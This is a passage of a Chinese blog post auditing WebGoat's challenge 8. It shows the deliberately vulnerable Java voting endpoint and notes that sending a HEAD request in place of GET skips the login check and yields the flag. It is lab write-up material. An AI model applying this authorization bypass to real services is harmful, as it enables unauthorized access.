<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8082/WebGoat/challenge/7/reset-password/375afe1104f4a487a73823c50a9292a2</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916190301274.png" alt="image-20220916190301274"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916190314529.png" alt="image-20220916190314529"></p>
<h3 id="challenge8"><a href="#challenge8" class="headerlink" title="challenge8"></a>challenge8</h3><h4 id="Challenge8"><a href="#Challenge8" class="headerlink" title="Challenge8"></a>Challenge8</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.challenges.challenge8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Category;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Lesson;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Challenge8</span> <span class="keyword">extends</span> <span class="title class_">Lesson</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Category <span class="title function_">getDefaultCategory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Category.CHALLENGE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTitle</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;challenge8.title&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Assignment8"><a href="#Assignment8" class="headerlink" title="Assignment8"></a>Assignment8</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.challenges.challenge8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.lessons.challenges.Flag;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.MediaType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PathVariable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.stream.Collectors;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Assignment8</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Map&lt;Integer,Integer&gt; votes = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        votes.put(<span class="number">1</span>, <span class="number">400</span>);</span><br><span class="line">        votes.put(<span class="number">2</span>, <span class="number">120</span>);</span><br><span class="line">        votes.put(<span class="number">3</span>, <span class="number">140</span>);</span><br><span class="line">        votes.put(<span class="number">4</span>, <span class="number">150</span>);</span><br><span class="line">        votes.put(<span class="number">5</span>, <span class="number">300</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@GetMapping(value = &quot;/challenge/8/vote/&#123;stars&#125;&quot;,produces = MediaType.APPLICATION_JSON_VALUE)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;?&gt; vote(<span class="meta">@PathVariable(value = &quot;stars&quot;)</span> <span class="type">int</span> nrOfStars , HttpServletRequest request)&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (request.getMethod().equals(<span class="string">&quot;GET&quot;</span>))&#123;</span><br><span class="line">            <span class="type">var</span> <span class="variable">json</span> <span class="operator">=</span> Map.of(<span class="string">&quot;error&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;message&quot;</span>, <span class="string">&quot;Sorry but you need to login first in order to vote&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ResponseEntity.status(<span class="number">200</span>).body(json);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">allVotesForStar</span> <span class="operator">=</span> votes.getOrDefault(nrOfStars,<span class="number">0</span>);</span><br><span class="line">        votes.put(nrOfStars,allVotesForStar +<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.ok().header(<span class="string">&quot;X-Flag&quot;</span>,<span class="string">&quot;Thanks for voting, your flag is: &quot;</span> + Flag.FLAGS.get(<span class="number">8</span>)).build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/challenge/8/votes/&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;?&gt; getVotes()&#123;</span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.ok(votes.entrySet().stream().collect(Collectors.toMap(e -&gt; <span class="string">&quot;&quot;</span> + e.getKey(),e-&gt; e.getValue())));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/challenge/8/votes/average&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;Map&lt;String ,Integer&gt;&gt; <span class="title function_">average</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">totalNumberOfVotes</span> <span class="operator">=</span> votes.values().stream().mapToInt(i-&gt;i.intValue()).sum();</span><br><span class="line">        <span class="type">int</span> <span class="variable">categories</span> <span class="operator">=</span> votes.entrySet().stream().mapToInt(e-&gt;e.getKey() * e.getValue()).reduce(<span class="number">0</span>,(a,b)-&gt;a+b);</span><br><span class="line">        <span class="type">var</span> <span class="variable">json</span> <span class="operator">=</span> Map.of(<span class="string">&quot;average&quot;</span>, (<span class="type">int</span>) Math.ceil((<span class="type">double</span>) categories / totalNumberOfVotes));</span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.ok(json);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/challenge/8/notUsed&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">notUsed</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Should never be called, challenge specific method&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当投票时显示需要登录</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916204629963.png" alt="image-20220916204629963"></p>
<p>但是当请求为HEAD时可进入下一步操作</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916204718045.png" alt="image-20220916204718045"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916204726635.png" alt="image-20220916204726635"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916204742991.png" alt="image-20220916204742991"></p>
<h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>通关了 除了有一关显示错误 一关不能做</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916205852859.png" alt="image-20220916205852859"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916210005892.png" alt="image-20220916210005892"></p>
</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/java/">java</a><a class="post-meta__tags" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a><a class="post-meta__tags" href="/tags/webgoat%E9%9D%B6%E5%9C%BA%E5%AE%A1%E8%AE%A1/">webgoat靶场审计</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.pixabay.com/photo/2018/08/23/07/35/thunderstorm-3625405_1280.jpg" data-sites="qq,wechat,weibo,facebook,twitter"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/Snipaste_2022-08-28_20-22-45.png" target="_blank"><img class="post-qr-code-img" src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/Snipaste_2022-08-28_20-22-45.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/Snipaste_2022-08-28_20-32-45.png" target="_blank"><img class="post-qr-code-img" src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/Snipaste_2022-08-28_20-32-45.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/abba44f.html"><img class="prev-cover" src="https://cdn.pixabay.com/photo/2016/10/18/21/28/seljalandsfoss-1751463_1280.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">shiro反序列化</div></div></a></div><div class="next-post pull-right"><a href="/623b8b34.html"><img class="next-cover" src="https://cdn.pixabay.com/photo/2016/12/14/04/08/thunderbolt-1905603_1280.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">RSA算法解释</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/d06ebb98.html" title="java的RMI协议"><img class="cover" src="https://cdn.pixabay.com/photo/2015/10/30/20/13/sea-1014710_1280.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-22</div><div class="title">java的RMI协议</div></div></a></div><div><a href="/abba44f.html" title="shiro反序列化"><img class="cover" src="https://cdn.pixabay.com/photo/2016/10/18/21/28/seljalandsfoss-1751463_1280.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-22</div><div class="title">shiro反序列化</div></div></a></div><div><a href="/acb83090.html" title="codeql"><img class="cover" src="https://cdn.pixabay.com/photo/2018/11/17/22/15/trees-3822149_1280.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-22</div><div class="title">codeql</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%89%E8%A3%85webgoat"><span class="toc-number">1.</span> <span class="toc-text">安装webgoat</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MyWebGoat"><span class="toc-number">2.</span> <span class="toc-text">MyWebGoat</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Server"><span class="toc-number">3.</span> <span class="toc-text">Server</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#server-StartWebGoat"><span class="toc-number">3.1.</span> <span class="toc-text">server.StartWebGoat</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#container"><span class="toc-number">4.</span> <span class="toc-text">container</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#WebGoat"><span class="toc-number">4.1.</span> <span class="toc-text">WebGoat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#users"><span class="toc-number">4.2.</span> <span class="toc-text">users</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WebGoatUser"><span class="toc-number">4.2.1.</span> <span class="toc-text">WebGoatUser</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lessons"><span class="toc-number">4.3.</span> <span class="toc-text">lessons</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Assignment"><span class="toc-number">4.3.1.</span> <span class="toc-text">Assignment</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lesson"><span class="toc-number">4.3.2.</span> <span class="toc-text">Lesson</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Category"><span class="toc-number">4.3.3.</span> <span class="toc-text">Category</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WebSession"><span class="toc-number">4.3.4.</span> <span class="toc-text">WebSession</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#session"><span class="toc-number">4.4.</span> <span class="toc-text">session</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#UserSessionData"><span class="toc-number">4.4.1.</span> <span class="toc-text">UserSessionData</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#webwolf"><span class="toc-number">5.</span> <span class="toc-text">webwolf</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#WebWolf"><span class="toc-number">5.1.</span> <span class="toc-text">WebWolf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#requests"><span class="toc-number">5.2.</span> <span class="toc-text">requests</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WebWolfTraceRepository"><span class="toc-number">5.2.1.</span> <span class="toc-text">WebWolfTraceRepository</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BC%82%E5%B8%B8%E5%90%AF%E5%8A%A8"><span class="toc-number">6.</span> <span class="toc-text">修复异常启动</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#container-1"><span class="toc-number">7.</span> <span class="toc-text">container</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MvcConfiguration"><span class="toc-number">7.1.</span> <span class="toc-text">MvcConfiguration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lessons-1"><span class="toc-number">7.2.</span> <span class="toc-text">lessons</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LessonScanner"><span class="toc-number">7.2.1.</span> <span class="toc-text">LessonScanner</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LessonTemplateResolver"><span class="toc-number">7.3.</span> <span class="toc-text">LessonTemplateResolver</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AsciiDoctorTemplateResolver-java"><span class="toc-number">7.4.</span> <span class="toc-text">AsciiDoctorTemplateResolver.java</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#asciidoc"><span class="toc-number">7.5.</span> <span class="toc-text">asciidoc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WebWolfMacro"><span class="toc-number">7.5.1.</span> <span class="toc-text">WebWolfMacro</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EnvironmentExposure"><span class="toc-number">7.5.2.</span> <span class="toc-text">EnvironmentExposure</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WebWolfRootMacro"><span class="toc-number">7.5.3.</span> <span class="toc-text">WebWolfRootMacro</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WebGoatVersionMacro"><span class="toc-number">7.5.4.</span> <span class="toc-text">WebGoatVersionMacro</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WebGoatTmpDirMacro"><span class="toc-number">7.5.5.</span> <span class="toc-text">WebGoatTmpDirMacro</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OperatingSystemMacro"><span class="toc-number">7.5.6.</span> <span class="toc-text">OperatingSystemMacro</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UsernameMacro"><span class="toc-number">7.5.7.</span> <span class="toc-text">UsernameMacro</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#i18n"><span class="toc-number">7.6.</span> <span class="toc-text">i18n</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PluginMessages"><span class="toc-number">7.6.1.</span> <span class="toc-text">PluginMessages</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Language"><span class="toc-number">7.6.2.</span> <span class="toc-text">Language</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Messages"><span class="toc-number">7.6.3.</span> <span class="toc-text">Messages</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#session-1"><span class="toc-number">7.7.</span> <span class="toc-text">session</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LabelDebugger"><span class="toc-number">7.7.1.</span> <span class="toc-text">LabelDebugger</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E8%AF%95%E4%B8%80%E4%B8%8B"><span class="toc-number">8.</span> <span class="toc-text">启动试一下</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#container-2"><span class="toc-number">9.</span> <span class="toc-text">container</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#WebSecurityConfig"><span class="toc-number">9.1.</span> <span class="toc-text">WebSecurityConfig</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#users-1"><span class="toc-number">9.2.</span> <span class="toc-text">users</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#UserService"><span class="toc-number">9.2.1.</span> <span class="toc-text">UserService</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UserRepository"><span class="toc-number">9.2.2.</span> <span class="toc-text">UserRepository</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UserTrackerRepository"><span class="toc-number">9.2.3.</span> <span class="toc-text">UserTrackerRepository</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UserTracker"><span class="toc-number">9.2.4.</span> <span class="toc-text">UserTracker</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LessonTracker"><span class="toc-number">9.2.5.</span> <span class="toc-text">LessonTracker</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AjaxAuthenticationEntryPoint"><span class="toc-number">9.3.</span> <span class="toc-text">AjaxAuthenticationEntryPoint</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lessons-2"><span class="toc-number">9.4.</span> <span class="toc-text">lessons</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Initializeable"><span class="toc-number">9.4.1.</span> <span class="toc-text">Initializeable</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DatabaseConfiguration"><span class="toc-number">9.5.</span> <span class="toc-text">DatabaseConfiguration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LessonDataSource"><span class="toc-number">9.6.</span> <span class="toc-text">LessonDataSource</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lessons-3"><span class="toc-number">9.7.</span> <span class="toc-text">lessons</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LessonConnectionInvocationHandler"><span class="toc-number">9.7.1.</span> <span class="toc-text">LessonConnectionInvocationHandler</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E4%B8%80%E4%B8%8B"><span class="toc-number">10.</span> <span class="toc-text">启动一下</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9B%B4%E6%94%B9%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%BAmysql"><span class="toc-number">11.</span> <span class="toc-text">更改数据库为mysql</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#server"><span class="toc-number">12.</span> <span class="toc-text">server</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#StartWebGoat"><span class="toc-number">12.1.</span> <span class="toc-text">StartWebGoat</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#container-3"><span class="toc-number">13.</span> <span class="toc-text">container</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#HammerHead"><span class="toc-number">13.1.</span> <span class="toc-text">HammerHead</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#session-2"><span class="toc-number">13.2.</span> <span class="toc-text">session</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Course"><span class="toc-number">13.2.1.</span> <span class="toc-text">Course</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#assignments"><span class="toc-number">13.3.</span> <span class="toc-text">assignments</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AssignmentHints"><span class="toc-number">13.3.1.</span> <span class="toc-text">AssignmentHints</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AssignmentPath"><span class="toc-number">13.3.2.</span> <span class="toc-text">AssignmentPath</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AssignmentEndpoint"><span class="toc-number">13.3.3.</span> <span class="toc-text">AssignmentEndpoint</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AttackResult"><span class="toc-number">13.3.4.</span> <span class="toc-text">AttackResult</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LessonTrackerInterceptor"><span class="toc-number">13.3.5.</span> <span class="toc-text">LessonTrackerInterceptor</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#controller"><span class="toc-number">13.4.</span> <span class="toc-text">controller</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Welcome"><span class="toc-number">13.4.1.</span> <span class="toc-text">Welcome</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#StartLesson"><span class="toc-number">13.4.2.</span> <span class="toc-text">StartLesson</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lessons-4"><span class="toc-number">13.5.</span> <span class="toc-text">lessons</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CourseConfiguration"><span class="toc-number">13.5.1.</span> <span class="toc-text">CourseConfiguration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hint"><span class="toc-number">13.5.2.</span> <span class="toc-text">Hint</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LessonInfoModel"><span class="toc-number">13.5.3.</span> <span class="toc-text">LessonInfoModel</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LessonMenuItem"><span class="toc-number">13.5.4.</span> <span class="toc-text">LessonMenuItem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LessonMenuItemType"><span class="toc-number">13.5.5.</span> <span class="toc-text">LessonMenuItemType</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WebWolfRedirect"><span class="toc-number">13.6.</span> <span class="toc-text">WebWolfRedirect</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#webwolf-1"><span class="toc-number">14.</span> <span class="toc-text">webwolf</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#user"><span class="toc-number">14.1.</span> <span class="toc-text">user</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#UserService-1"><span class="toc-number">14.1.1.</span> <span class="toc-text">UserService</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UserRepository-1"><span class="toc-number">14.1.2.</span> <span class="toc-text">UserRepository</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WebGoatUser-1"><span class="toc-number">14.1.3.</span> <span class="toc-text">WebGoatUser</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WebSecurityConfig-1"><span class="toc-number">14.2.</span> <span class="toc-text">WebSecurityConfig</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MvcConfiguration-1"><span class="toc-number">14.3.</span> <span class="toc-text">MvcConfiguration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#requests-1"><span class="toc-number">14.4.</span> <span class="toc-text">requests</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Requests"><span class="toc-number">14.4.1.</span> <span class="toc-text">Requests</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LandingPage"><span class="toc-number">14.4.2.</span> <span class="toc-text">LandingPage</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FileServer"><span class="toc-number">14.5.</span> <span class="toc-text">FileServer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mailbox"><span class="toc-number">14.6.</span> <span class="toc-text">mailbox</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Email"><span class="toc-number">14.6.1.</span> <span class="toc-text">Email</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MailboxController"><span class="toc-number">14.6.2.</span> <span class="toc-text">MailboxController</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MailboxRepository"><span class="toc-number">14.6.3.</span> <span class="toc-text">MailboxRepository</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jwt"><span class="toc-number">14.7.</span> <span class="toc-text">jwt</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JWTController"><span class="toc-number">14.7.1.</span> <span class="toc-text">JWTController</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JWTToken"><span class="toc-number">14.7.2.</span> <span class="toc-text">JWTToken</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#resources"><span class="toc-number">14.8.</span> <span class="toc-text">resources</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#container-4"><span class="toc-number">15.</span> <span class="toc-text">container</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#service"><span class="toc-number">15.1.</span> <span class="toc-text">service</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EnvironmentService"><span class="toc-number">15.1.1.</span> <span class="toc-text">EnvironmentService</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HintService"><span class="toc-number">15.1.2.</span> <span class="toc-text">HintService</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LabelDebugService"><span class="toc-number">15.1.3.</span> <span class="toc-text">LabelDebugService</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LabelService"><span class="toc-number">15.1.4.</span> <span class="toc-text">LabelService</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LessonInfoService"><span class="toc-number">15.1.5.</span> <span class="toc-text">LessonInfoService</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LessonMenuService"><span class="toc-number">15.1.6.</span> <span class="toc-text">LessonMenuService</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LessonProgressService"><span class="toc-number">15.1.7.</span> <span class="toc-text">LessonProgressService</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LessonTitleService"><span class="toc-number">15.1.8.</span> <span class="toc-text">LessonTitleService</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ReportCardService"><span class="toc-number">15.1.9.</span> <span class="toc-text">ReportCardService</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RestartLessonService"><span class="toc-number">15.1.10.</span> <span class="toc-text">RestartLessonService</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SessionService"><span class="toc-number">15.1.11.</span> <span class="toc-text">SessionService</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#users-2"><span class="toc-number">15.2.</span> <span class="toc-text">users</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RegistrationController"><span class="toc-number">15.2.1.</span> <span class="toc-text">RegistrationController</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UserValidator"><span class="toc-number">15.2.2.</span> <span 